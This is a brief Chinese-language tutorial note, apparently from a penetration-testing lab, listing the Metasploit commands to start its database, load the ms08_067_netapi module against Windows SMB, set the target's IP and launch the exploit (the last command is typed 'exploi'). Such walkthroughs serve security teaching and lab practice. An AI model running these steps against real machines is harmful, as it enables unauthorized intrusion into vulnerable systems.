
#
```

```

#

```
預先處理:第一次執行msfconsole時先執行下列步驟
啟動metasploit所需的資料庫

service postgresql start
msfdb init
```
```
啟動攻擊神器====>輸入msfconsole
```
```
search ms08_067
```

```
使用ms08_067_netapi攻擊模組

use exploit/windows/smb/ms08_067_netapi
```


```
顯示需要設定參數的選項=====  show options
```


```
設定各種參數====
set  RHOST   < 弱機的IP>
```


```
下達發動攻擊的指令====exploi

```
